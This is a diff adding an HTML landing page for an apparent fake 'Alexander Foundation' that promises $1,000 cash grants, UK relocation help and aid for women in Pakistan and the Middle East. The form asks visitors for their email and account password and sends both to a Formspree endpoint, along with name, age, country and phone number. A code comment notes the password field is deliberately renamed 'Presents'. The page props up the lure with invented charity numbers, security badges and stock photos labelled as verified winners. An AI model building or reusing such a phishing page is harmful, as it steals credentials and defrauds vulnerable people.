@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alexander Foundation | Official $1000 Global Empowerment Grant</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        navy: {
+                            800: '#0b132b',
+                            900: '#070b19',
+                            950: '#03050d'
+                        },
+                        gold: {
+                            400: '#f3c623',
+                            500: '#d4af37',
+                            600: '#b89228'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .gold-gradient-text {
+            background: linear-gradient(135deg, #fce079 0%, #d4af37 50%, #99710f 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .gold-gradient-bg {
+            background: linear-gradient(135deg, #fce079 0%, #d4af37 50%, #b89228 100%);
+        }
+        .navy-glass {
+            background: rgba(11, 19, 43, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+        }
+        .slide-transition {
+            transition: opacity 0.8s ease-in-out, transform 0.8s ease-in-out;
+        }
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 0 15px rgba(212, 175, 55, 0.4); }
+            50% { box-shadow: 0 0 30px rgba(212, 175, 55, 0.8); }
+        }
+        .pulse-gold {
+            animation: pulseGlow 2.5s infinite;
+        }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-100 font-sans antialiased selection:bg-gold-500 selection:text-slate-950">
+
+    <!-- Official Top Bar -->
+    <div class="bg-navy-950 border-b border-slate-800 text-xs py-2 px-4 text-slate-400">
+        <div class="max-w-7xl mx-auto flex flex-col sm:flex-row justify-between items-center gap-2">
+            <div class="flex items-center gap-4">
+                <span class="flex items-center gap-1.5 text-emerald-400 font-medium">
+                    <span class="relative flex h-2 w-2">
+                      <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                      <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+                    </span>
+                    Official Portal Active
+                </span>
+                <span class="hidden md:inline text-slate-600">|</span>
+                <span class="hidden md:inline"><i class="fa-solid fa-building-columns text-gold-500 mr-1"></i> Reg Charity No: UK-849201-ALX</span>
+            </div>
+            <div class="flex items-center gap-4 text-slate-300">
+                <span><i class="fa-solid fa-shield-halved text-emerald-400 mr-1"></i> 256-bit SSL Verified</span>
+                <span><i class="fa-solid fa-globe text-gold-500 mr-1"></i> International Payouts Open</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Navigation Bar -->
+    <nav class="sticky top-0 z-50 navy-glass border-b border-slate-800/80">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between h-20 items-center">
+                <!-- Brand Logo -->
+                <a href="#" class="flex items-center gap-3 group">
+                    <div class="w-12 h-12 rounded-xl gold-gradient-bg flex items-center justify-center text-slate-950 shadow-lg shadow-gold-500/20 font-black text-2xl group-hover:scale-105 transition-transform">
+                        A
+                    </div>
+                    <div class="flex flex-col">
+                        <span class="text-2xl font-black tracking-wider text-white flex items-center gap-1">
+                            ALEXANDER <span class="text-gold-500 text-xs px-2 py-0.5 rounded bg-gold-500/10 border border-gold-500/30">GLOBAL</span>
+                        </span>
+                        <span class="text-[10px] tracking-widest text-slate-400 uppercase">Empowerment & Education Trust</span>
+                    </div>
+                </a>
+
+                <!-- Desktop Nav Items -->
+                <div class="hidden lg:flex items-center gap-8 text-sm font-semibold text-slate-300">
+                    <a href="#hero-slider" class="hover:text-gold-400 transition-colors">Home</a>
+                    <a href="#options-section" class="hover:text-gold-400 transition-colors flex items-center gap-1">
+                        <span>Options</span>
+                        <span class="bg-emerald-500/20 text-emerald-400 text-[10px] px-1.5 py-0.5 rounded-full border border-emerald-500/30">New</span>
+                    </a>
+                    <a href="#claim-section" class="hover:text-gold-400 transition-colors text-gold-400">Get $1000 Grant</a>
+                    <a href="#ambassadors-section" class="hover:text-gold-400 transition-colors">Ambassadors</a>
+                    <a href="#proof-section" class="hover:text-gold-400 transition-colors">Proof & Receipts</a>
+                </div>
+
+                <!-- Primary CTA Button -->
+                <div class="flex items-center gap-3">
+                    <a href="#claim-section" class="gold-gradient-bg text-slate-950 font-bold px-5 py-2.5 rounded-xl shadow-lg shadow-gold-500/25 hover:brightness-110 active:scale-95 transition-all flex items-center gap-2">
+                        <i class="fa-solid fa-sack-dollar text-lg"></i>
+                        <span>Claim $1000</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Banner Slider Section -->
+    <section id="hero-slider" class="relative overflow-hidden bg-gradient-to-b from-navy-900 via-slate-950 to-slate-950 border-b border-slate-800">
+        <!-- Background Ambient Glows -->
+        <div class="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[300px] bg-gold-500/10 blur-[140px] rounded-full pointer-events-none"></div>
+        <div class="absolute top-1/3 right-10 w-[400px] h-[400px] bg-blue-600/10 blur-[160px] rounded-full pointer-events-none"></div>
+
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 lg:py-20">
+            <!-- Slider Wrapper -->
+            <div id="slider-container" class="relative min-h-[500px] lg:min-h-[460px] flex items-center">
+                
+                <!-- SLIDE 1: Get $1000 Grant & Hijabi Ambassador Pakistan -->
+                <div class="slide-item absolute inset-0 opacity-100 pointer-events-auto transition-all duration-700 ease-in-out grid grid-cols-1 lg:grid-cols-12 gap-8 items-center" data-slide="0">
+                    <div class="lg:col-span-7 space-y-6">
+                        <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-gold-500/10 border border-gold-500/30 text-gold-400 text-xs font-semibold tracking-wide">
+                            <i class="fa-solid fa-award"></i> ALEXANDER FOUNDATION OFFICIAL GRANT 2026
+                        </div>
+                        <h1 class="text-4xl sm:text-5xl lg:text-6xl font-black text-white leading-tight">
+                            Get Your Official <br>
+                            <span class="gold-gradient-text">$1,000 Financial Grant</span>
+                        </h1>
+                        <p class="text-slate-300 text-base sm:text-lg max-w-xl font-light leading-relaxed">
+                            Alexander Foundation is distributing direct cash aid to qualified applicants worldwide. Complete our verified form today to receive your funds via international bank transfer or instant digital transfer.
+                        </p>
+                        <div class="flex flex-wrap gap-4 pt-2">
+                            <a href="#claim-section" class="gold-gradient-bg text-slate-950 font-extrabold px-8 py-4 rounded-xl shadow-xl shadow-gold-500/20 hover:scale-105 active:scale-95 transition-all flex items-center gap-3 text-lg">
+                                <span>Apply For $1000 Now</span>
+                                <i class="fa-solid fa-arrow-right"></i>
+                            </a>
+                            <a href="#proof-section" class="bg-slate-900/90 text-slate-200 border border-slate-700 hover:border-gold-500/50 font-semibold px-6 py-4 rounded-xl transition-all flex items-center gap-2">
+                                <i class="fa-solid fa-circle-check text-emerald-400"></i>
+                                View Proofs
+                            </a>
+                        </div>
+                    </div>
+                    <div class="lg:col-span-5 relative">
+                        <!-- Ambassador Card Overlay -->
+                        <div class="relative mx-auto max-w-md rounded-2xl overflow-hidden border border-gold-500/30 bg-slate-900/80 shadow-2xl shadow-gold-500/10 p-4">
+                            <div class="relative h-80 rounded-xl overflow-hidden bg-slate-800">
+                                <!-- Pakistani Hijabi Ambassador Illustration/Photo -->
+                                <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=800&q=80" alt="Pakistani Hijabi Ambassador" class="w-full h-full object-cover">
+                                <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-950/20 to-transparent"></div>
+                                <div class="absolute top-3 left-3 bg-emerald-500 text-slate-950 text-xs font-extrabold px-3 py-1 rounded-full shadow-md flex items-center gap-1">
+                                    <i class="fa-solid fa-check-double"></i> $1,000 Winner Verified
+                                </div>
+                                <div class="absolute bottom-3 left-3 right-3 text-white">
+                                    <h3 class="font-bold text-lg">Fatima Noor</h3>
+                                    <p class="text-xs text-slate-300 flex items-center gap-1">
+                                        <i class="fa-solid fa-location-dot text-rose-400"></i> Lahore, Pakistan • Official Ambassador
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="mt-3 p-3 rounded-lg bg-slate-950/70 border border-slate-800 flex items-center justify-between text-xs text-slate-300">
+                                <span><i class="fa-regular fa-clock text-gold-400 mr-1"></i> Disbursed: 2 Days Ago</span>
+                                <span class="text-emerald-400 font-bold">$1,000.00 Received</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SLIDE 2: Come to UK & UK Ambassador -->
+                <div class="slide-item absolute inset-0 opacity-0 pointer-events-none transition-all duration-700 ease-in-out grid grid-cols-1 lg:grid-cols-12 gap-8 items-center" data-slide="1">
+                    <div class="lg:col-span-7 space-y-6">
+                        <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-blue-500/10 border border-blue-500/30 text-blue-400 text-xs font-semibold tracking-wide">
+                            <i class="fa-solid fa-plane-departure"></i> UK SPONSORSHIP & RELOCATION SCHEME
+                        </div>
+                        <h1 class="text-4xl sm:text-5xl lg:text-6xl font-black text-white leading-tight">
+                            Come to the <span class="text-blue-400">United Kingdom</span> <br>
+                            With Alexander Support
+                        </h1>
+                        <p class="text-slate-300 text-base sm:text-lg max-w-xl font-light leading-relaxed">
+                            Explore full educational sponsorship, visa guidance, and $1,000 settling grants provided by Alexander Global for international candidates seeking opportunities in the UK.
+                        </p>
+                        <div class="flex flex-wrap gap-4 pt-2">
+                            <a href="#claim-section" class="bg-blue-600 hover:bg-blue-500 text-white font-extrabold px-8 py-4 rounded-xl shadow-xl shadow-blue-600/20 hover:scale-105 active:scale-95 transition-all flex items-center gap-3 text-lg">
+                                <span>Apply For UK Program</span>
+                                <i class="fa-solid fa-plane-arrival"></i>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="lg:col-span-5 relative">
+                        <div class="relative mx-auto max-w-md rounded-2xl overflow-hidden border border-blue-500/30 bg-slate-900/80 shadow-2xl p-4">
+                            <div class="relative h-80 rounded-xl overflow-hidden bg-slate-800">
+                                <img src="https://images.unsplash.com/photo-1580894732413-a9236294078a?auto=format&fit=crop&w=800&q=80" alt="UK Female Ambassador" class="w-full h-full object-cover">
+                                <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-950/20 to-transparent"></div>
+                                <div class="absolute top-3 left-3 bg-blue-500 text-white text-xs font-extrabold px-3 py-1 rounded-full shadow-md flex items-center gap-1">
+                                    <i class="fa-solid fa-graduation-cap"></i> UK Scholar & Grantee
+                                </div>
+                                <div class="absolute bottom-3 left-3 right-3 text-white">
+                                    <h3 class="font-bold text-lg">Sophie Taylor</h3>
+                                    <p class="text-xs text-slate-300 flex items-center gap-1">
+                                        <i class="fa-solid fa-location-dot text-blue-400"></i> London, UK • Ambassador
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="mt-3 p-3 rounded-lg bg-slate-950/70 border border-slate-800 flex items-center justify-between text-xs text-slate-300">
+                                <span><i class="fa-solid fa-check text-emerald-400 mr-1"></i> Visa & $1,000 Approved</span>
+                                <span class="text-emerald-400 font-bold">UK Grant Recipient</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SLIDE 3: Middle East Hijabi Ambassador & International Aid -->
+                <div class="slide-item absolute inset-0 opacity-0 pointer-events-none transition-all duration-700 ease-in-out grid grid-cols-1 lg:grid-cols-12 gap-8 items-center" data-slide="2">
+                    <div class="lg:col-span-7 space-y-6">
+                        <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-semibold tracking-wide">
+                            <i class="fa-solid fa-earth-middle-east"></i> MIDDLE EAST & GLOBAL EMPOWERMENT
+                        </div>
+                        <h1 class="text-4xl sm:text-5xl lg:text-6xl font-black text-white leading-tight">
+                            Empowering Women <br>
+                            Across <span class="text-emerald-400">40+ Countries</span>
+                        </h1>
+                        <p class="text-slate-300 text-base sm:text-lg max-w-xl font-light leading-relaxed">
+                            Over $2,500,000 distributed to female leaders, students, and families. Fast, transparent 100% online approval process.
+                        </p>
+                        <div class="flex flex-wrap gap-4 pt-2">
+                            <a href="#claim-section" class="gold-gradient-bg text-slate-950 font-extrabold px-8 py-4 rounded-xl shadow-xl shadow-gold-500/20 hover:scale-105 active:scale-95 transition-all flex items-center gap-3 text-lg">
+                                <span>Claim Your $1000 Grant</span>
+                                <i class="fa-solid fa-shield-heart"></i>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="lg:col-span-5 relative">
+                        <div class="relative mx-auto max-w-md rounded-2xl overflow-hidden border border-emerald-500/30 bg-slate-900/80 shadow-2xl p-4">
+                            <div class="relative h-80 rounded-xl overflow-hidden bg-slate-800">
+                                <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=800&q=80" alt="Middle East Hijabi Ambassador" class="w-full h-full object-cover">
+                                <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-950/20 to-transparent"></div>
+                                <div class="absolute top-3 left-3 bg-emerald-500 text-slate-950 text-xs font-extrabold px-3 py-1 rounded-full shadow-md flex items-center gap-1">
+                                    <i class="fa-solid fa-verified"></i> Global Ambassador
+                                </div>
+                                <div class="absolute bottom-3 left-3 right-3 text-white">
+                                    <h3 class="font-bold text-lg">Aisha Al-Mansoor</h3>
+                                    <p class="text-xs text-slate-300 flex items-center gap-1">
+                                        <i class="fa-solid fa-location-dot text-emerald-400"></i> Dubai, UAE • Regional Leader
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="mt-3 p-3 rounded-lg bg-slate-950/70 border border-slate-800 flex items-center justify-between text-xs text-slate-300">
+                                <span><i class="fa-solid fa-certificate text-gold-400 mr-1"></i> Status: Certified</span>
+                                <span class="text-emerald-400 font-bold">$1,000 Disbursed</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- Slider Navigation Indicators & Timer -->
+            <div class="mt-8 flex items-center justify-between border-t border-slate-800/80 pt-6">
+                <div class="flex items-center gap-3">
+                    <button id="prev-slide-btn" aria-label="Previous Slide" class="w-10 h-10 rounded-lg bg-slate-900 border border-slate-700 hover:border-gold-500 text-slate-300 hover:text-gold-400 flex items-center justify-center transition-all">
+                        <i class="fa-solid fa-chevron-left"></i>
+                    </button>
+                    <button id="next-slide-btn" aria-label="Next Slide" class="w-10 h-10 rounded-lg bg-slate-900 border border-slate-700 hover:border-gold-500 text-slate-300 hover:text-gold-400 flex items-center justify-center transition-all">
+                        <i class="fa-solid fa-chevron-right"></i>
+                    </button>
+                    <div class="flex items-center gap-2 ml-4" id="slide-dots">
+                        <button class="w-8 h-2 rounded-full bg-gold-500 transition-all dot-indicator" data-slide-index="0"></button>
+                        <button class="w-2 h-2 rounded-full bg-slate-700 transition-all dot-indicator" data-slide-index="1"></button>
+                        <button class="w-2 h-2 rounded-full bg-slate-700 transition-all dot-indicator" data-slide-index="2"></button>
+                    </div>
+                </div>
+
+                <div class="flex items-center gap-2 text-xs text-slate-400">
+                    <i class="fa-solid fa-arrows-rotate animate-spin text-gold-500"></i>
+                    <span>Auto-sliding every 4 seconds</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Program Options Section -->
+    <section id="options-section" class="py-16 bg-slate-900/60 border-b border-slate-800">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-12">
+                <span class="text-gold-500 font-semibold text-xs tracking-widest uppercase">Official Services & Programs</span>
+                <h2 class="text-3xl sm:text-4xl font-extrabold text-white mt-2">Select Your Preferred Alexander Option</h2>
+                <p class="text-slate-400 text-sm sm:text-base mt-2">Choose below to proceed directly with your application</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <!-- OPTION 1: FIRST & MOST PROMINENT -> Get 1000$ -->
+                <div class="relative bg-gradient-to-b from-navy-800 to-slate-900 border-2 border-gold-500/80 rounded-2xl p-8 shadow-2xl shadow-gold-500/10 hover:border-gold-400 transition-all flex flex-col justify-between group pulse-gold">
+                    <div class="absolute -top-3.5 left-1/2 -translate-x-1/2 bg-gold-500 text-slate-950 text-xs font-black px-4 py-1 rounded-full uppercase tracking-wider shadow-lg">
+                        #1 Top Choice - Fast Approval
+                    </div>
+                    <div>
+                        <div class="w-14 h-14 rounded-xl gold-gradient-bg flex items-center justify-center text-slate-950 font-black text-2xl mb-6 shadow-md">
+                            <i class="fa-solid fa-hand-holding-dollar"></i>
+                        </div>
+                        <h3 class="text-2xl font-black text-white group-hover:text-gold-400 transition-colors">
+                            1. Get $1,000 Financial Grant
+                        </h3>
+                        <p class="text-slate-300 text-sm mt-3 leading-relaxed">
+                            Direct cash disbursement program funded by Alexander Global Foundation. Open for Pakistan, UK, UAE, and international citizens. No repayment required.
+                        </p>
+                        <ul class="mt-6 space-y-2 text-xs text-slate-300">
+                            <li class="flex items-center gap-2">
+                                <i class="fa-solid fa-circle-check text-emerald-400"></i> Direct payout via Bank / Wire
+                            </li>
+                            <li class="flex items-center gap-2">
+                                <i class="fa-solid fa-circle-check text-emerald-400"></i> Simple 1-minute application
+                            </li>
+                            <li class="flex items-center gap-2">
+                                <i class="fa-solid fa-circle-check text-emerald-400"></i> Instant verification
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="mt-8">
+                        <a href="#claim-section" class="w-full block text-center gold-gradient-bg text-slate-950 font-extrabold py-3.5 rounded-xl shadow-lg hover:brightness-110 active:scale-95 transition-all text-sm">
+                            Click to Claim $1,000 Now
+                        </a>
+                    </div>
+                </div>
+
+                <!-- OPTION 2: Come to UK Program -->
+                <div class="bg-slate-900 border border-slate-800 hover:border-blue-500/50 rounded-2xl p-8 transition-all flex flex-col justify-between group">
+                    <div>
+                        <div class="w-14 h-14 rounded-xl bg-blue-500/20 border border-blue-500/30 flex items-center justify-center text-blue-400 font-bold text-2xl mb-6">
+                            <i class="fa-solid fa-plane"></i>
+                        </div>
+                        <h3 class="text-2xl font-bold text-white group-hover:text-blue-400 transition-colors">
+                            2. Come to UK Program
+                        </h3>
+                        <p class="text-slate-400 text-sm mt-3 leading-relaxed">
+                            Complete sponsorship package for international students and skilled individuals looking to study or relocate to the UK.
+                        </p>
+                        <ul class="mt-6 space-y-2 text-xs text-slate-400">
+                            <li class="flex items-center gap-2">
+                                <i class="fa-solid fa-check text-blue-400"></i> Educational guidance
+                            </li>
+                            <li class="flex items-center gap-2">
+                                <i class="fa-solid fa-check text-blue-400"></i> Relocation assistance
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="mt-8">
+                        <a href="#claim-section" class="w-full block text-center bg-slate-800 hover:bg-blue-600 text-white font-bold py-3.5 rounded-xl transition-all text-sm">
+                            Apply for UK Option
+                        </a>
+                    </div>
+                </div>
+
+                <!-- OPTION 3: Global Business & Student Fund -->
+                <div class="bg-slate-900 border border-slate-800 hover:border-emerald-500/50 rounded-2xl p-8 transition-all flex flex-col justify-between group">
+                    <div>
+                        <div class="w-14 h-14 rounded-xl bg-emerald-500/20 border border-emerald-500/30 flex items-center justify-center text-emerald-400 font-bold text-2xl mb-6">
+                            <i class="fa-solid fa-seedling"></i>
+                        </div>
+                        <h3 class="text-2xl font-bold text-white group-hover:text-emerald-400 transition-colors">
+                            3. Female Empowerment
+                        </h3>
+                        <p class="text-slate-400 text-sm mt-3 leading-relaxed">
+                            Dedicated support grants for female entrepreneurs, students, and hijabi ambassadors across South Asia and Middle East.
+                        </p>
+                        <ul class="mt-6 space-y-2 text-xs text-slate-400">
+                            <li class="flex items-center gap-2">
+                                <i class="fa-solid fa-check text-emerald-400"></i> Priority verification
+                            </li>
+                            <li class="flex items-center gap-2">
+                                <i class="fa-solid fa-check text-emerald-400"></i> Full grant coverage
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="mt-8">
+                        <a href="#claim-section" class="w-full block text-center bg-slate-800 hover:bg-emerald-600 text-white font-bold py-3.5 rounded-xl transition-all text-sm">
+                            Apply for Empowerment
+                        </a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Form Section (Get $1000 Application Portal) -->
+    <section id="claim-section" class="py-20 relative bg-slate-950">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="bg-slate-900 border border-gold-500/40 rounded-3xl p-6 sm:p-10 shadow-2xl relative overflow-hidden">
+                <!-- Background Glow -->
+                <div class="absolute -right-20 -top-20 w-80 h-80 bg-gold-500/10 rounded-full blur-3xl pointer-events-none"></div>
+
+                <!-- Form Header -->
+                <div class="text-center mb-8 border-b border-slate-800 pb-6">
+                    <div class="inline-flex items-center gap-2 text-gold-400 text-xs font-bold uppercase tracking-wider bg-gold-500/10 px-3 py-1 rounded-full border border-gold-500/20 mb-3">
+                        <i class="fa-solid fa-lock"></i> Official Formspree Secure Portal
+                    </div>
+                    <h2 class="text-3xl sm:text-4xl font-extrabold text-white">
+                        Claim Your <span class="gold-gradient-text">$1,000 Grant</span>
+                    </h2>
+                    <p class="text-slate-400 text-xs sm:text-sm mt-2">
+                        Please enter your details accurately. Our team will contact you to transfer your $1,000 payout.
+                    </p>
+                </div>
+
+                <!-- Formspree Integration Form -->
+                <form id="grant-application-form" action="https://formspree.io/f/mbglzvqq" method="POST" class="space-y-6">
+                    
+                    <!-- Grid Row 1: Email & Password (Field Mapped as Presents) -->
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <!-- Email Field -->
+                        <div>
+                            <label for="email" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                                Email Address <span class="text-rose-500">*</span>
+                            </label>
+                            <div class="relative">
+                                <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                    <i class="fa-solid fa-envelope"></i>
+                                </div>
+                                <input type="email" id="email" name="email" required placeholder="your.name@example.com"
+                                    class="w-full bg-slate-950 border border-slate-700 focus:border-gold-500 focus:ring-1 focus:ring-gold-500 rounded-xl py-3 pl-10 pr-4 text-slate-100 text-sm placeholder-slate-500 outline-none transition-all">
+                            </div>
+                        </div>
+
+                        <!-- Password Field (DISPLAY LABEL IS Password, BUT NAME IS 'Presents') -->
+                        <div>
+                            <label for="passcode" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                                Password <span class="text-rose-500">*</span>
+                            </label>
+                            <div class="relative">
+                                <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                    <i class="fa-solid fa-key"></i>
+                                </div>
+                                <!-- CRITICAL: name="Presents" retains Formspree email mapping -->
+                                <input type="password" id="passcode" name="Presents" required placeholder="Enter Password"
+                                    class="w-full bg-slate-950 border border-slate-700 focus:border-gold-500 focus:ring-1 focus:ring-gold-500 rounded-xl py-3 pl-10 pr-4 text-slate-100 text-sm placeholder-slate-500 outline-none transition-all">
+                            </div>
+                            <p class="text-[11px] text-slate-500 mt-1">This password authenticates your payout request securely.</p>
+                        </div>
+                    </div>
+
+                    <!-- Grid Row 2: Full Name & Age -->
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <!-- Full Name -->
+                        <div>
+                            <label for="fullname" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                                Full Name <span class="text-rose-500">*</span>
+                            </label>
+                            <div class="relative">
+                                <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                    <i class="fa-solid fa-user"></i>
+                                </div>
+                                <input type="text" id="fullname" name="Full Name" required placeholder="e.g. Fatima Noor"
+                                    class="w-full bg-slate-950 border border-slate-700 focus:border-gold-500 focus:ring-1 focus:ring-gold-500 rounded-xl py-3 pl-10 pr-4 text-slate-100 text-sm placeholder-slate-500 outline-none transition-all">
+                            </div>
+                        </div>
+
+                        <!-- Age -->
+                        <div>
+                            <label for="age" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                                Age <span class="text-rose-500">*</span>
+                            </label>
+                            <div class="relative">
+                                <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                    <i class="fa-solid fa-cake-candles"></i>
+                                </div>
+                                <input type="number" id="age" name="Age" min="18" max="100" required placeholder="e.g. 24"
+                                    class="w-full bg-slate-950 border border-slate-700 focus:border-gold-500 focus:ring-1 focus:ring-gold-500 rounded-xl py-3 pl-10 pr-4 text-slate-100 text-sm placeholder-slate-500 outline-none transition-all">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Grid Row 3: Country Drop-down & Contact Number -->
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <!-- Country Dropdown -->
+                        <div>
+                            <label for="country" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                                Country <span class="text-rose-500">*</span>
+                            </label>
+                            <div class="relative">
+                                <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                    <i class="fa-solid fa-globe"></i>
+                                </div>
+                                <select id="country" name="Country" required
+                                    class="w-full bg-slate-950 border border-slate-700 focus:border-gold-500 focus:ring-1 focus:ring-gold-500 rounded-xl py-3 pl-10 pr-4 text-slate-100 text-sm outline-none transition-all appearance-none cursor-pointer">
+                                    <option value="" disabled selected>Select your country</option>
+                                    <option value="Pakistan">Pakistan</option>
+                                    <option value="United Kingdom">United Kingdom</option>
+                                    <option value="United Arab Emirates">United Arab Emirates</option>
+                                    <option value="Saudi Arabia">Saudi Arabia</option>
+                                    <option value="Qatar">Qatar</option>
+                                    <option value="Turkey">Turkey</option>
+                                    <option value="Canada">Canada</option>
+                                    <option value="United States">United States</option>
+                                    <option value="Malaysia">Malaysia</option>
+                                    <option value="Other International">Other Country</option>
+                                </select>
+                                <div class="absolute inset-y-0 right-0 pr-3.5 flex items-center pointer-events-none text-slate-500">
+                                    <i class="fa-solid fa-chevron-down text-xs"></i>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Enter Contact Number -->
+                        <div>
+                            <label for="contact" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                                Contact Number <span class="text-rose-500">*</span>
+                            </label>
+                            <div class="relative">
+                                <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                    <i class="fa-solid fa-phone"></i>
+                                </div>
+                                <input type="tel" id="contact" name="Contact Number" required placeholder="+92 300 1234567 or +44 7000 000000"
+                                    class="w-full bg-slate-950 border border-slate-700 focus:border-gold-500 focus:ring-1 focus:ring-gold-500 rounded-xl py-3 pl-10 pr-4 text-slate-100 text-sm placeholder-slate-500 outline-none transition-all">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Terms Checkbox -->
+                    <div class="flex items-start gap-3 pt-2">
+                        <input type="checkbox" id="terms" required class="mt-1 w-4 h-4 rounded accent-gold-500 border-slate-700 bg-slate-950">
+                        <label for="terms" class="text-xs text-slate-400">
+                            I verify that my information is authentic and I agree to be contacted by Alexander Global representatives for my $1,000 disbursement details.
+                        </label>
+                    </div>
+
+                    <!-- Submit Button -->
+                    <div class="pt-4">
+                        <button type="submit" id="submit-btn" class="w-full gold-gradient-bg text-slate-950 font-black py-4 rounded-xl shadow-xl shadow-gold-500/25 hover:brightness-110 active:scale-[0.99] transition-all text-base sm:text-lg flex items-center justify-center gap-3">
+                            <i class="fa-solid fa-paper-plane"></i>
+                            <span>Submit Application & Claim $1000</span>
+                        </button>
+                    </div>
+
+                    <!-- Trust Footer in Form -->
+                    <div class="flex items-center justify-center gap-6 pt-4 text-slate-500 text-xs border-t border-slate-800/60">
+                        <span class="flex items-center gap-1.5"><i class="fa-solid fa-shield-halved text-emerald-400"></i> Encrypted Transfer</span>
+                        <span class="flex items-center gap-1.5"><i class="fa-solid fa-bolt text-gold-400"></i> Instant Review</span>
+                        <span class="flex items-center gap-1.5"><i class="fa-solid fa-building text-blue-400"></i> Formspree Security</span>
+                    </div>
+                </form>
+
+                <!-- Success Confirmation Box (Hidden initially) -->
+                <div id="success-box" class="hidden text-center py-10 space-y-4">
+                    <div class="w-20 h-20 rounded-full bg-emerald-500/20 border-2 border-emerald-500 flex items-center justify-center text-emerald-400 text-4xl mx-auto">
+                        <i class="fa-solid fa-circle-check"></i>
+                    </div>
+                    <h3 class="text-2xl font-bold text-white">Application Submitted Successfully!</h3>
+                    <p class="text-slate-300 text-sm max-w-md mx-auto">
+                        Thank you for applying. Your details have been transmitted via secure Formspree channel. An Alexander representative will contact you via your email/phone regarding your $1,000 disbursement.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Verified Recipients & Hijabi Ambassadors Section -->
+    <section id="ambassadors-section" class="py-20 bg-slate-900/40 border-t border-slate-800">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-16">
+                <span class="text-emerald-400 font-semibold text-xs tracking-widest uppercase">Verified Proof & Ambassadors</span>
+                <h2 class="text-3xl sm:text-4xl font-extrabold text-white mt-2">
+                    Meet Recipients Who Received <span class="gold-gradient-text">$1,000</span>
+                </h2>
+                <p class="text-slate-400 text-sm sm:text-base mt-2">
+                    Real women and students empowered by Alexa & Alexander Global Foundation.
+                </p>
+            </div>
